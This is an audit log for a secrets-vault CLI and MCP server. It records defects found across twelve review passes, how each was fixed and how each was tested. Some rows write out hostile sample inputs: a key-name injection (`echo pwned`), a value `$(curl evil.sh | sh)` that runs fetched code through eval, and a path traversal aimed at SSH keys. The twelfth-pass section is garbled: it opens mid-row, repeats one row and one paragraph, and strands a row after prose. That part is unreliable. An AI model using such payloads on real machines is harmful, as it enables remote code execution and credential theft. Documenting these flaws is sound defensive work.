# Audit log

Every pass made over this codebase looking for defects, what each one found,
and what changed as a result. It is kept because the *shape* of the mistakes is
more useful than the list of them — several were found only after the thing
meant to catch them turned out to be broken itself.

The threat model and the known limitations live in [SECURITY.md](../SECURITY.md).

## Findings from the audit, and what changed

An adversarial pass over the codebase found these. All are fixed, each with a
regression test.

| Severity | Issue | Fix |
|---|---|---|
| Critical | `save()` truncated the vault before writing — a crash or full disk destroyed every secret | Write to temp, `fsync`, `rename` |
| High | Children inherited `HUSH_VAULT` / `HUSH_HOME` / `HUSH_AGE_IDENTITY`, so an injected process could re-open the vault and read *everything*, not just what it was given | Strip the whole `HUSH_*` namespace from the inherited environment |
| High | `policy.json` *replaced* `denyCommands`, so a config written by an older version silently missed every protection added since | The built-in list is a floor; file entries are unioned with it |
| High | `denyCommands` had no interpreters — `hush_run node -e "…"` wrote the entire environment to a file, past the redactor | Added interpreters, archivers, encoders and network tools; documented the limit |
| High | `allowEnvs` was checked against the base environment only, so an agent pinned to `dev` could name any account, including production | Every resolved scope is checked |
| Medium | The identity was passed to `security` as an argv element, visible in `ps` to every local process | Passed on stdin |
| Medium | Approval grants were cached globally, so an approval in one vault satisfied an identical scope in another | Grants keyed by vault directory |
| Medium | `/api/reveal` in the UI returned plaintext with no approval or biometry check | Goes through the same policy as everything else |
| Medium | Resolving an age identity ran on every command, so `hush ls` could wake a YubiKey | Lazy and memoised; only touched when the vault actually has age recipients |
| Medium | `removeRecipient` deleted the member before re-sealing, so a failing age plugin left a half-applied revocation | Rolls back on failure |
| Low | UI session token compared with `!==` | `timingSafeEqual` |
| Low | `hush run` called `process.exit()`, truncating piped output | Sets `process.exitCode` |
| Low | `hush export --out` left an existing file's permissions alone | `chmod 0600` after write |
| Low | A crash during a secret prompt left the terminal in raw mode | Restored on exit |
| Low | An oversized UI request body kept buffering after rejection | Socket destroyed |
| Low | A crafted age identity file could name an arbitrary plugin binary | Plugin name constrained |

### Second pass

| Severity | Issue | Fix |
|---|---|---|
| Critical | Concurrent writes silently lost data. Eight `hush set` commands at once left **one** surviving key: each process read the vault, edited its own copy, and the last write erased the rest. Atomic save prevented corruption but not lost updates | An exclusive lock around read-modify-write, plus a replay journal so value edits land on the newer copy instead of overwriting it. Membership and rotation changes refuse to merge rather than guessing |
| High | **Rollback.** Every value is authenticated, but nothing proves *freshness*. A revoked member kept their old checkout — in which they are still a recipient and the values are still live — and force-pushed it back to regain access | A per-vault high-water mark of the data-key generation. The mark never moves down, so a vault that goes backwards warns on every command, names who reappeared, and fails `hush verify`. `hush verify --accept` is the deliberate way to accept a real restore |
| Low | `seenDir` was a module-level constant capturing `HUSH_HOME` at import, making it untestable and unresponsive to a caller setting it — the same trap as the biometry platform check | Resolved per call |

Rollback is worth being precise about: this detection cannot *prevent* the
attack, only make it impossible to perform quietly. Branch protection on the
repository holding the vault is the actual control.

### Third pass

| Severity | Issue | Fix |
|---|---|---|
| High | **Command injection through key names.** Nothing validated them, and `hush export --shell` emitted `export FOO; echo pwned; X="v"` — which `hush hook` feeds straight to `eval`. A member with legitimate write access could run commands on every teammate's machine | Names must be POSIX identifiers, enforced at the single write path. Generators filter rather than escape, because there is no safe way to `export` a non-identifier |
| High | **Secrets stayed loaded after leaving a project.** The shell hook exported them and never unloaded, so `cd` out of a repo carried production credentials into every unrelated process — including a coding agent | The hook records what it exported and unsets it on the way out. (zsh does not word-split unquoted parameters, so the first version's `unset` silently did nothing — the emitted code is now shell-specific) |
| High | **Revocation could be a lie.** Two members could share a name; `hush team rm bob` removed one, reported success, and left the other with full access | Names must be unique. Removal deletes every entry with that name, so a vault written before the rule is still fully revoked |
| Medium | **The agent-visible preview leaked up to half a secret.** `preview()` revealed a fixed five characters above length eight, so a ten-character token showed five of them through `hush_describe_secret` | Nothing below twenty characters; above it, at most a quarter |
| Medium | **Any tool error killed the MCP server.** Tracking in-flight calls with `p.finally()` created a second promise that rejected unhandled — self-inflicted while fixing the shutdown race | `p.then(done, done)`, plus end-to-end transport tests that had been missing entirely |
| Medium | **`hush export` and `hush run` disagreed.** Export materialised only the base environment, silently omitting every service-account secret, so a generated `.env` did not match what the app got at run time | Both use the same resolution |
| Medium | **Multi-line secrets were truncated on input.** `cat key.pem \| hush set PRIVATE_KEY` stored only the first line — a PEM key being among the likeliest things to store | A single-value prompt consumes all of stdin; only multi-variable flows read line by line |
| Medium | **Values did not survive export → import.** The writer escaped, the parser did not unescape | Symmetric escaping, with round-trip tests over awkward values |
| Medium | **Ten seconds of CPU on a chatty command.** The redactor always carried `maxLen-1` bytes, so one long secret made every write rescan kilobytes | The carry is now only a live partial match — 25× faster, with the straddle guard kept (removing it leaked a whole value, caught by a test) |
| Medium | **A killed `hush run` orphaned its child**, still holding every injected credential; a signal-killed child also reported success | Signals are forwarded, and a signal death reports 128+n |
| Low | A malformed `link.json` crashed with an internal Node path error; a corrupt vault said `Unexpected token 'h'` | Both name the file and say how to recover. A git-conflicted vault is detected specifically, and `hush init` now writes `.gitattributes` marking the vault unmergeable so git raises a conflict instead of blending two vaults into an unopenable one |
| Low | The MCP server buffered unbounded input lines; missing required arguments reached `spawn` as the string "undefined" | A 4 MB line cap and explicit argument validation |
| Low | Dead code: an orphaned `injectable()`, unused imports across six files | Removed; `noUnusedLocals` is on permanently so it cannot creep back |
| Low | The MCP server resolved the project root with a forward-slash-only regex (wrong on Windows); scope names accepted `..` | Both separators; dot segments refused |

### Fourth pass — crypto review and the hardware path

Two things were previously listed as "cannot be verified here". Both had an
achievable form that was simply skipped.

**Crypto properties are now pinned by adversarial tests**, including ones the
code does not itself enforce and would lose silently if the backend changed:

- A **low-order X25519 public key** cannot yield a predictable shared secret.
  This matters: if ECDH returned all zeros for those points, an admin tricked
  into running `hush team add mallory <crafted-key>` would make the vault
  readable by anyone holding the file, no private key needed. OpenSSL rejects
  all seven classic points — but that is inherited, not enforced by hush, so it
  is now asserted.
- Every seal uses a fresh IV (2000 samples), data-key generations are
  independent, tampering with any field of a value *or* a wrap is detected, a
  wrap cannot be transplanted to another recipient, and the KDF genuinely
  depends on both public keys.

**The hardware path is now tested without hardware.** The age plugin protocol is
age's code, not hush's; what hush owns is detecting a plugin identity, invoking
age correctly, and reporting failures. A stub plugin and a stub `age` cover all
of it — and doing so found two real bugs:

| Severity | Issue | Fix |
|---|---|---|
| High | `recipientsForIdentity` only fell back to the plugin when `age-keygen -y` **threw**. A plugin identity where it exits zero without printing a recipient was reported as having none — so a real YubiKey would silently look like "no hardware key here", dropping the user back to a software identity | Fall back whenever the first source yields nothing |
| Medium | `ageBinary()` shelled out to `which`, which does not exist on Windows and is absent from many minimal container images. The age bridge would report "age is not installed" on exactly the machines where that is hardest to diagnose | PATH is resolved in Node, honouring PATHEXT on Windows, with no subprocess |
| Low | A negative lookup was cached for the process lifetime, so installing `age` after `hush age` told you to would go unnoticed for the whole MCP session | Positive results memoised; negative ones expire after five seconds |

### Fifth pass — conformance, the ladder's top rung, and the untested surfaces

**The scheme is now validated against an independent implementation.**
`test/scheme-conformance.test.ts` reimplements hush/v1 in WebCrypto, written
against the documented spec rather than against `src/crypto.ts`, and checks it
opens what hush produced. That shows two things self-testing cannot: the scheme
is specified precisely enough for someone else to implement, and hush matches
that specification rather than merely being self-consistent. Every primitive is
also differentially tested — node:crypto and WebCrypto must agree on HKDF-SHA256,
AES-256-GCM with AAD, and X25519 — which is much of what a reviewer checks for
primitive misuse.

| Severity | Issue | Fix |
|---|---|---|
| High | **The top rung of the ladder was unreachable.** `hush secure --hardware` ends by telling you to run `hush team rm <you>` to retire your software key — and that command refused with "You cannot remove yourself", unconditionally. The entire hardware upgrade the tool recommends could not be completed | The guard is about lock-out, not identity: retiring one of your keys is allowed while another of yours remains a recipient, and still refused when it would leave you with none |
| Medium | `ui.ts` had **no automated coverage at all** — an HTTP server that can hand out every key you own | 20 tests: token and near-miss rejection, DNS-rebinding via a raw request (`fetch` silently drops a `Host` override, so the obvious test asserts nothing), CSP, name and scope validation, malformed and oversized bodies, and that no value ever appears in the HTML or in `/api/state` |
| Medium | `secure.ts` had no coverage either, and performs the only destructive operations in hush | 10 CLI-level tests, including that it will not delete a `.env` without a confirmation it cannot obtain non-interactively, and never records a protection it cannot enforce |

### Sixth pass — the hardware path, driven for real

The remaining gap was "we cannot test the hardware path without hardware". That
was only half true. `test/fixtures/age-plugin-mock` implements the actual
[C2SP age-plugin protocol](https://github.com/C2SP/C2SP/blob/main/age-plugin.md),
so the **real `age` binary drives it exactly as it drives age-plugin-yubikey** —
recipient-v1, identity-v1, and the `-> msg` stanza a hardware key uses to ask
for a touch.

The complete upgrade is now exercised end to end in CI: hush detects the plugin
identity as hardware, adds a plugin-backed recipient through real age, credits
the hardware rung, retires the software key, re-keys the vault, and then opens it
**only** through the plugin.

What that leaves unproven is one thing: whether `age-plugin-yubikey` correctly
speaks USB to the device. That is that project's responsibility and its own test
suite — nothing in hush sits between them.

Independent human review of the scheme is still worth having. The conformance
suite raises the floor; it does not replace a reviewer.

### Seventh pass — fuzzing and mutation testing

Two methods not used before. Fuzzing checks invariants over inputs nobody chose;
mutation testing checks whether the tests would notice if a fix were removed.

**Fuzzing** (`test/fuzz.test.ts`, seeded so failures reproduce) asserts that no
secret survives *any* chunking of *any* output, that values round-trip through
export and import unchanged, and that the vault agrees with a plain model over
random operation sequences. Every regex was also checked for catastrophic
backtracking; all are linear.

**Mutation testing** deliberately reintroduced ~25 past bugs to see which the
suite would catch. Seven survived, meaning seven real fixes had no test holding
them in place — including the atomic save, the vault lock, the `allowEnvs`
account check, and the command deny list. All are now pinned.

And it found a live bug:

| Severity | Issue | Fix |
|---|---|---|
| High | **The vault lock could be stolen, losing a write that reported success.** `open(…,"wx")` creates the lock file *empty* and fills it a moment later. Staleness was judged by parsing the file's contents, so a second writer landing in that window saw unparseable JSON, concluded the lock was dead, deleted it, and proceeded. Two writers then held it at once — one write vanished while its command printed "✓ added". Reproduced at roughly one run in five | Staleness is judged by mtime, which is fresh from the instant the file exists. Reclaiming an abandoned lock re-checks mtime first |

That bug was found by refusing to dismiss a flaky test. Making the failure
*diagnosable* — printing what the losing writer said — turned "sometimes 7 of 8"
into "PAR_1 reported success and is not in the vault", which named the cause
immediately.

Two mutants survive deliberately. The constant-time token comparison is
functionally identical to `===`, and no functional test can distinguish them.
The rollback watermark's write condition is idempotent, so relaxing it changes
nothing observable. Both are equivalent mutants rather than coverage gaps.

### Eighth pass — the .env dropzone

A new feature is new surface, so it got the same treatment. Four issues in the
code that had just been written:

| Severity | Issue | Fix |
|---|---|---|
| Medium | **Staging held plaintext without limit.** Each dropped file was parsed and kept server-side for 15 minutes; nothing capped how many. A page left open could pin an unbounded amount of secret material in memory | 20 uploads / 8 MB, refused with a message naming the fix |
| Medium | **Discard did not discard.** The button dropped only the page's own reference; the server kept the plaintext until the TTL, and the upload stayed importable | An explicit `/api/discard`, called on cancel |
| Medium | **Relabelling unsealed the secret.** `/api/tag` decrypted the value and re-sealed it just to change a note — so a hardware-backed identity would ask for a touch to rename a tag. The note is metadata beside the ciphertext, not inside it and not in the AAD | `vault.retag()` edits the note only. A test proves it works for someone who cannot decrypt the vault at all |
| Low | **Two files defining the same key collided.** Row choices were keyed by variable name, so dropping two `.env`s that both set `FAL_KEY` made one row's scope, tag and checkbox drive both | Keyed per row |

Plus client-side guards the server could not provide: a file-size check before
the tab reads a multi-gigabyte drop into memory, a file-count cap, and a
double-submit guard (a second click re-sent spent stages and reported them as
expired).

**A usability trap worth naming**, because it would have cost someone an
afternoon: filing a key into a service account the project does not *use* is
accepted, but `hush run` then silently does not inject it. Import now reports
which accounts are not in use, with a one-click fix.

**The page script had no coverage at all.** The whole UI is a template string,
so TypeScript never looks at it — a syntax error there compiles cleanly, passes
every server test, and ships a blank page. There is now a test that parses it,
runs its `esc()` against hostile input, executes its row-key function to prove
two files stay apart, and checks that every data-bearing interpolation into
markup is escaped. That last one found `s.id` reaching an attribute raw; a
hardcoded catalogue key today, so not exploitable, but escaped now.

### Ninth pass — drift, dead config, and coverage holes

Documentation and configuration rot silently; no behavioural test notices. A
consistency checker comparing code against everything that describes it found:

| Severity | Issue | Fix |
|---|---|---|
| Medium | **`allowReveal` was dead config.** Declared in the policy, defaulted, written into every generated `policy.json` — and never read. Its comment referenced `hush_reveal`, a tool that never existed. In a security tool, a knob that looks like a control but is inert is worse than no knob | Removed, with a test asserting every policy field is actually read |
| Low | The README still documented `hush_request_secret`, removed two passes earlier, and showed a stale `requireApproval` default | Fixed, with tests that fail if either drifts again |
| Low | `unsafeAllowCommands` — the only way past the command deny list — was documented nowhere | Documented, with a test that every policy field appears somewhere a user would look |
| Low | `--with fal:mod io` and `--with fal::` were accepted, failing later with a worse message | Both halves validated at the flag |
| Low | `hush ls` said "No secrets" without mentioning that other environments or accounts existed, so a vault whose contents live elsewhere looked empty | Both are listed either way |

**Five surfaces had no tests at all**: the UI's `/api/account` and `/api/team`
endpoints (the latter re-keys the vault on member removal), and the
`hush_list_accounts`, `hush_check_repo` and `hush_provision` MCP tools —
including the one that resolves "use my acme fal key". Adding them found that
`hush_provision` reported **"Ready"** for an account holding only some of a
service's variables, so an agent would start a deploy that failed halfway with a
confusing auth error.

Validation failures also answered **500** rather than 400, reading as server
faults. There is now a `ValidationError` type thrown by the name, size and key
checks, so bad input is distinguishable from a real fault — replacing a brittle
message-matching regex that had already gone stale once.

### Tenth pass — `hush doctor` had gone stale

The "is my setup right?" command was still describing the tool as it was five
passes earlier. It never mentioned the security ladder, the policy actually in
force, the agent skill, the age bridge, or service accounts — and it repeated a
bug already fixed in `hush ls`, printing `fal/personal` under "envs" as though
an account were an environment.

| Severity | Issue | Fix |
|---|---|---|
| Low | doctor listed service accounts as environments | Reported separately, with a marker for which are pinned |
| Low | doctor said nothing when accounts existed but none were pinned — so `hush run` injects none of them, silently | Called out explicitly |
| Low | doctor never showed the approval policy, the skill, the hardware bridge, or the ladder rung | All reported, with the next step |
| Low | The biometry line ticked `"preferred"`, which still falls back to a click, while the ladder withholds rung 4 until `"required"` — two parts of the tool disagreeing about the same state | Ticked only when actually enforcing |

That last one is the interesting kind: not a crash, just two surfaces telling
the user different things about the same setting.

### Eleventh pass — attacking staleness at the source

The last several passes all found the same shape of defect: one part of the tool
stops agreeing with another as features land around it. Rather than keep finding
instances, this pass went after the cause — **every fact stated in more than one
place**.

| Severity | Issue | Fix |
|---|---|---|
| Medium | **The default policy was written out by hand in three places**: `DEFAULT_POLICY`, the template `hush install-mcp` writes, and `hush secure approval`. That is exactly how `allowReveal` kept being written into every new project after it had stopped meaning anything | Both copies now derive from the exported defaults |
| Low | **The version was typed into three files** — `src/cli.ts`, `src/mcp.ts` and `package.json` — so `hush --version` and the version the MCP server reports to a client could disagree with what was published | One `src/version.ts`, with a test that it matches `package.json` and that nothing else declares it |
| Low | `hush install-mcp` wrote all fifty-two built-in denied commands into each project's `policy.json`, where they read as a curated choice and go stale — while `loadPolicy` applies that floor regardless | The generated file carries only the knobs a person would tune |
| Low | Three comments claimed line counts. One described a file as roughly half the size it had grown to | Removed, with a test that refuses any reintroduced line count — including in this document, which is how this very row got rewritten |

The tests added here are the point: not "this file currently says 120", but
**"no comment may claim a line count at all"**, and **"the default policy may not
be retyped outside `mcp.ts`"**. A check that a duplicate is *correct* has to be
maintained; a check that a duplicate *does not exist* does not.

One test in this pass was written as a regex over the source, asserting how the
code was written rather than what it does. That is the same brittleness that had
already gone stale once in the UI's error handling, so it was rewritten to
generate a policy and read it.

### Twelfth pass — the mutation harness was lying

This pass began by re-running mutation testing across every module rather than
only the recently-touched ones. It found more in the harness than in the code.

**Two harness bugs, in opposite directions.** The first shell version passed a
space-separated list of test files as one unquoted variable — which zsh does not
word-split — so `node --test` got a single nonexistent filename every time, the
`# fail` line never appeared, and *every mutation was reported as surviving*. The
rewrite in Node fixed that and introduced the opposite fault: it copied only the
directories it thought were needed, so the worker's copy was missing `LICENSE`
and `RESEARCH.md`, `consistency.test.ts` failed on a broken documentation link
*before any mutation was applied*, and **every mutation was reported as killed**.
Five batches of results — 87 mutations — were worthless, and they were worthless
in the flattering direction.

A third fault showed up later: the harness re-read each source file from the
live repository on every job, so an edit made while a run was in flight changed
what the remaining mutations were applied to. The run then measured a mix of two
trees and reported it as one number.

The fixes are not better copy lists. The harness now runs the unmutated tree
first and refuses to start unless the baseline is green; it snapshots every
source file once at the start; and it checks at the end that nothing moved
underneath it. A mutation run without a green baseline measures nothing, a
measurement that can only come back "good" is not a measurement, and a run
spanning two versions of a file describes neither of them.

With a trustworthy harness, the honest first number was **89 of 137 killed**.

| Severity | Issue | Fix |
|---|---|---|
, backticks and backslashes. A value of `$(curl evil.sh \| sh)` therefore ran on every machine whose hook loaded that vault. The comment above the function had considered exactly this risk for variable *names* and filtered them; the value half went unexamined | Values are single-quoted, with the quote character escaped the POSIX way. Tested by running the generated script through `sh`, `bash` and `zsh` and asserting that a canary file never appears |
| **Critical** | **The published package did not run at all.** Node refuses to strip TypeScript types for any file under `node_modules`, so `npm install hush && hush --version` failed with `ERR_UNSUPPORTED_NODE_MODULES_TYPE_STRIPPING` — and so did every other command. "No build step" is true of developing hush and was never true of installing it. Every test ran from the checkout, where stripping works, so a green suite said nothing about the artifact | `npm run build` emits `dist/`, `prepack` runs it, the tarball ships it, and the bin shim prefers it while still running straight from `src/` in a clone. Tested by packing, installing and using it |
| High | **`.hush/link.json` could name any path on the machine.** It is documented as safe to commit, so it arrives from whoever wrote the repository you cloned. A relative name was joined onto `~/.hush/vaults`, which `../../.ssh/id_ed25519` walks straight out of; an absolute one was taken as given, including `/dev/zero` | A relative name must be one safe segment; the target must be a regular file; an absolute path outside `~/.hush` is announced on stderr rather than followed silently |
| High | **A parse failure printed the contents of the file it failed on.** V8 puts an excerpt in the message — `Unexpected token 'r', "root:x:0:0:…" is not valid JSON`. Together with the row above, cloning a repository and running any hush command put the first bytes of an attacker-chosen file on the terminal, and into the agent's context if the agent was the one who ran it | The excerpt is stripped; the position, which is the useful half, survives |
| **Critical** | **A secret's _value_ could run commands on every teammate's machine.** `hush export --shell` is fed straight to `eval` by the shell hook, on every directory change. Values went through `JSON.stringify`, which produces a *double*-quoted shell string — and inside double quotes a shell still expands dollar signs, backticks and backslashes. A value that was a command substitution therefore ran on every machine whose hook loaded that vault. The comment above the function had considered exactly this risk for variable *names* and filtered them; the value half went unexamined | Values are single-quoted, with the quote character escaped the POSIX way. Tested by running the generated script through `sh`, `bash` and `zsh` and asserting that a canary file never appears |
| High | **`hush_add_secret` checked the platform before the policy.** On any host without native dialogs — every Linux box, and macOS when the approver was switched to the terminal flow — a scope `allowEnvs` forbids was never refused. The fallback message then handed the agent the exact command to run in the terminal to obtain the forbidden account | Policy first, capability second |
| High | **The vault file was trusted after one check of its `scheme` string.** It arrives over git, from whoever opened the pull request. A vault with `"generation": "lots"` decrypted perfectly and silently disabled rollback detection, because `"lots" < 4` is false and so is `"lots" > 4` — the comparison that is supposed to shout simply stopped shouting | `assertVaultShape` on load: a shape check, not a schema, so a vault from a newer hush still opens |
| High | **A generation of 2^53 poisoned the rollback watermark permanently.** Every genuine vault afterwards reads as rolled back, so the warning fires constantly and `hush verify` never passes again | Generation bounded above as well as below |
| High | **The concurrent-merge path adopted an on-disk vault without validating it.** `saveLocked()` is the one place that takes a vault file wholesale without going through `open()` — so a malformed file landing there would replace the in-memory copy and be written straight back out, laundering it into the repo | The merge validates the same way `open()` does |
| High | **A data-key wrap with no member entry was invisible.** The wraps map grants decryption; `recipients` is the list people read. A wrap whose fingerprint is absent from `recipients` opens every secret while `hush team ls` shows no such member — the shape a revoked member would leave to keep quiet access | `hush verify` reports unlisted wraps and fails on them |
| Medium | **`hush add` reported success having stored nothing.** With no terminal and nothing piped it printed "nothing entered, nothing changed" and exited 0, so a CI job that checked the exit code believed the credential was stored | Fails when there was no way to enter anything; names the variables left unset on a partial write |
| Medium | **Strings out of the vault file were rendered raw.** A five-megabyte note took `hush ls` out with a kill signal, and an ANSI escape in a note or a member name is interpreted by the terminal rather than shown by it — so it can erase the lines above and rewrite what a reviewer thinks they are reading | One `safeText` for every file-sourced string that reaches a screen |
| Medium | **A directory named `age` on `PATH` was taken for the binary.** A directory's execute bit means "traversable", so `accessSync(p, X_OK)` is satisfied by one — and the failure then surfaced as EACCES from the middle of a decrypt rather than as "age is not installed". `HUSH_AGE_BIN` had the same hole via `existsSync` | Both paths require a regular file with the execute bit |
| Medium | **The rollback watermark compared roster *length*, not content.** Adding a member does not mint a new generation, so a roster that changed without growing left a stale name list, and `reappeared` would then name the wrong people | Compared by content |
| Low | **`gen` was stamped on every value and read by nothing.** Dead metadata that looked like a check | It now drives a re-seal completeness check: a value left on an older generation means a rotation did not finish, so a revoked member's old key still opens it. `hush verify` reports and fails on it |
| Low | **The MCP approval prompt had no configurable timeout.** Two minutes of a blocked tool call is a blocked agent, and on a headless box where no dialog can ever appear it is two minutes of nothing | `approvalTimeoutSeconds` |

The worst of these was found by reading rather than by mutation. Mutation
testing asks "would anything notice if this line changed?"; it cannot ask
"is what this line does safe?". `toShellExports` had a test, the test passed,
and the test asserted the vulnerable output format verbatim — so every mutation
of that line was dutifully killed by a test that was pinning the bug in place.

| Low | **`findExampleFile` was exported and called by nothing.** The same shape as the `gen` field: dead code reads as a feature, and someone eventually extends it or trusts it is doing something | Removed, with a check that refuses any export nothing uses — a test counts as a use, which is the right bar for anything other people are meant to call |
| Low | **Three of this pass's own test edits corrupted the files they were editing.** A patch script whose replacement text contained a backtick terminated its own template literal and spliced a whole file into the middle of itself: `src/run.ts` ended up containing two complete copies, and `SECURITY.md` two copies with the stale one first. TypeScript caught the source; nothing would have caught the document | Checks that no document repeats a heading and no source file declares a top-level symbol twice |
| Low | **A hand-edited JSON example in the README did not parse** — a trailing comma, in a config block someone would copy | Every fenced `json` block in the docs is parsed by a test |

The three worst findings here came from reading and from trying the thing, not
from mutation. Mutation testing asks "would anything notice if this line
changed?"; it cannot ask "is what this line does safe?", and it cannot ask "does
any of this work once it is installed".

`toShellExports` had a test, the test passed, and the test asserted the
vulnerable output format verbatim — so every mutation of that line was dutifully
killed by a test that was pinning the bug in place. And the whole package was
unusable after `npm install` while 354 tests passed, because every one of them
ran from the checkout. The lesson is the same one the harness taught: a check
has to be able to fail for the reason you care about, or it is decoration.

**Tests, not fixes, were most of the work.** Forty-three properties had no test
at all — among them: an expired approval grant being honoured, a biometric
*denial* being ignored, `allowCommands` not enforced, the deny list matched
against the whole path rather than the command name, the UI binding every
interface, the identity file's permissions, `hush get` printing a credential
without confirmation, `--with` not overriding a pinned account, and the vault
being written in place rather than replaced.

**Three tests were passing vacuously**, which is the same failure as an untested
property but harder to see:

- A CLI helper wrapped `execFileSync` in a `try/catch` that turned *any*
  exception into `{ code: 1 }`. A `ReferenceError` from a missing import was
  therefore indistinguishable from a command that ran and failed, and a test
  asserting a non-zero exit passed without the CLI ever starting. There is now a
  drift check that refuses the pattern outright.
- The low-order-point test asserted only "something threw". A change to the JWK
  shape would have satisfied it just as well. It now runs a legitimate key
  through the same path first, so "it threw" means something.
- A control-character test asserted over `JSON.stringify` of the output, which
  escapes every control character — so the regex could never match and the test
  passed with the sanitiser removed.

Two mutations were checked individually and are genuinely equivalent; they are
listed below rather than chased with contorted tests.

### Mutants that survive on purpose

Four mutations are known to be behaviourally identical, each checked
individually rather than assumed:

- The constant-time token comparison versus `===`. No functional test can see
  the difference.
- The ladder's rung filter (`c.rung <= r` versus `=== r`). The loop breaks on
  the first failing rung, so by iteration *r* every earlier rung has already
  passed — the two are provably equivalent.
- The `rung === 5` half of the nudge guard. Reaching rung 5 means every check
  passed, and `next` is the first failing check — so at rung 5 `next` is always
  null and the `!p.next` half has already returned.
- The `fsync` before the rename. Removing it is invisible to every in-process
  test, because what it buys is durability across a power cut rather than any
  behaviour a running program can observe. It stays because the cost is one
  syscall per save and the thing it protects is the whole vault.

One more was equivalent only *because* of a defence that was already there: the
data-key cache is keyed by fingerprint, and mis-keying it changes nothing
because membership is re-checked before the cache is consulted. Removing the
re-check as well is caught immediately — which is the useful way to state it.

The rollback watermark's write condition used to be on this list. It is not
equivalent any more: the condition now compares the member list by content
rather than by length, and a test covers the case that distinguishes them.

Reaching the temp-file cleanup took some care, and is worth recording because
the first attempt did not. Every obvious way to break a save — a directory where
the vault should be, an unwritable parent — throws *before* the temp file is
created, so the cleanup never runs and a test built on one of those passes
without exercising anything. The test that does work makes the destination
immutable with `chflags`, so the temp file is written and fsynced and only then
is the rename refused.
